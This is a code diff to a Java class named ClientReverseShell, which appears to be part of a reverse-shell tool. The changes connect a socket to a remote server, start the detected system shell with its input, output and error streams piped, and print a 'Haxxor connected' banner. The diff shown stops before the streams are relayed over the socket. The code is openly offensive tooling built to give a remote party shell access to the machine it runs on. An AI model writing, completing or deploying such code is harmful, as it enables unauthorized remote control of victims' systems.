@@ -3,6 +3,8 @@ package dev.drzymala.reversesheller;
 import lombok.NoArgsConstructor;
 
 import java.io.IOException;
+import java.io.InputStream;
+import java.io.OutputStream;
 import java.net.InetSocketAddress;
 import java.net.Socket;
 
@@ -69,11 +71,17 @@ public class ClientReverseShell {
 
         detectOperatingSystem();
 
-        try (Socket clientSocket = new Socket();) {
-            String prompt = null;
+        try (Socket clientSocket = new Socket()) {
+
+            clientSocket.setSoTimeout(100);
             clientSocket.connect(inetServerSocket);
-            Process remoteShell = new ProcessBuilder(prompt).redirectInput(ProcessBuilder.Redirect.PIPE)
+
+            Process remoteShell = new ProcessBuilder(this.detectedShell).redirectInput(ProcessBuilder.Redirect.PIPE)
                     .redirectOutput(ProcessBuilder.Redirect.PIPE).redirectError(ProcessBuilder.Redirect.PIPE).start();
+            OutputStream stdin = remoteShell.getOutputStream();
+            InputStream stdout = remoteShell.getInputStream();
+            InputStream stderr = remoteShell.getErrorStream();
+            System.out.println("Haxxor connected “ψ (｀∇´) ψ ... ◥(ฅº￦ºฅ)◤ ...\n");
 
         } catch (IOException e) {
             throw new RuntimeException(e);
